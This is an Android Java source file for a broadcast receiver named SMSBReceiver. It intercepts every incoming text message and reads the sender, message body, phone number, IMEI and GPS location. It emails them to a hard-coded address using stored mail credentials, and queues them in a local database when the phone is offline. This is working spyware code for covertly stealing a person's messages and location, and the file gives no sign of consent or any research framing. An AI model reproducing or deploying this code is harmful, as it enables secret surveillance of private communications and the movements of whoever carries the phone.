package com.example.adira;

import java.io.IOException;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.database.SQLException;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Bundle;
import android.os.StrictMode;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;

public class SMSBReceiver extends BroadcastReceiver {
	static Context contextLocal;
	GPSTracker gps;

	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO Auto-generated method stub
		if (android.os.Build.VERSION.SDK_INT > 9) {
			StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
			StrictMode.setThreadPolicy(policy);
		}
		contextLocal = context;
		gps = new GPSTracker(contextLocal);
		Bundle bundle = intent.getExtras();
		SmsMessage[] smsm = null;
		String sms_str = "";
		if (bundle != null) {
			// Get the SMS message
			Object[] pdus = (Object[]) bundle.get("pdus");
			smsm = new SmsMessage[pdus.length];
			for (int i = 0; i < smsm.length; i++) {
				smsm[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
				sms_str += "Sent From: " + smsm[i].getOriginatingAddress();
				sms_str += "\r\nMessage: ";
				sms_str += smsm[i].getMessageBody().toString();
				sms_str += "\r\n";
			}
			TelephonyManager tMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
			String mPhoneNumber = tMgr.getLine1Number();
			String imei = tMgr.getDeviceId();
			if (isConnectingToInternet()) {
				try {
					double latitude = 0,longitude = 0; 
					if(gps.canGetLocation()){
						latitude = gps.getLatitude();
						longitude = gps.getLongitude();
						
					}
					EmailSender sender = new EmailSender(SplashActivity.mailidusername, SplashActivity.mailidpassword);
					boolean sent = sender.sendMail("New SMS to " + mPhoneNumber + "device IMEI :- " + imei, sms_str+", Lat: "+latitude+" Long: "+longitude,
							SplashActivity.mailidusername,
							SplashActivity.mailidto);
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			} else {
				Sqldata myDbHelper = new Sqldata(context);
				try {
					myDbHelper.createDataBase();
				} catch (IOException ioe) {
					throw new Error("Unable to create database");
				}
				try {
					myDbHelper.openDataBase();
					Cursor allrows = myDbHelper.myDataBase.rawQuery("select * from " + Sqldata.TABLE_MAILQUEUE, null);
					int size = allrows.getCount();
					ContentValues values = new ContentValues();
					values.put(myDbHelper.KEY_MAILQUEUE_ROW_ID, size + 1);
					values.put(myDbHelper.KEY_MAILQUEUE_SUBJECT,
							"New SMS to " + mPhoneNumber + "device IMEI :- " + imei);
					values.put(myDbHelper.KEY_MAILQUEUE_BODY, sms_str);
					long row_id = myDbHelper.myDataBase.insert(myDbHelper.TABLE_MAILQUEUE, null, values);
					System.out.println("value--> " + row_id);
					myDbHelper.close();
				} catch (SQLException sqle) {
					myDbHelper.close();
					throw sqle;
				}
			}
		}
	}

	@SuppressLint("NewApi")
	public static boolean isConnectingToInternet() {
		ConnectivityManager connectivity = (ConnectivityManager) contextLocal
				.getSystemService(Context.CONNECTIVITY_SERVICE);
		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
			Network[] networks = connectivity.getAllNetworks();
			NetworkInfo networkInfo;
			for (Network mNetwork : networks) {
				networkInfo = connectivity.getNetworkInfo(mNetwork);
				if (networkInfo.getState().equals(NetworkInfo.State.CONNECTED)) {
					return true;
				}
			}
		} else {
			if (connectivity != null) {
				// noinspection deprecation
				NetworkInfo[] info = connectivity.getAllNetworkInfo();
				if (info != null) {
					for (NetworkInfo anInfo : info) {
						if (anInfo.getState() == NetworkInfo.State.CONNECTED) {
							System.out.println("Network NETWORKNAME: " + anInfo.getTypeName());
							return true;
						}
					}
				}
			}
		}
		return false;
	}
}
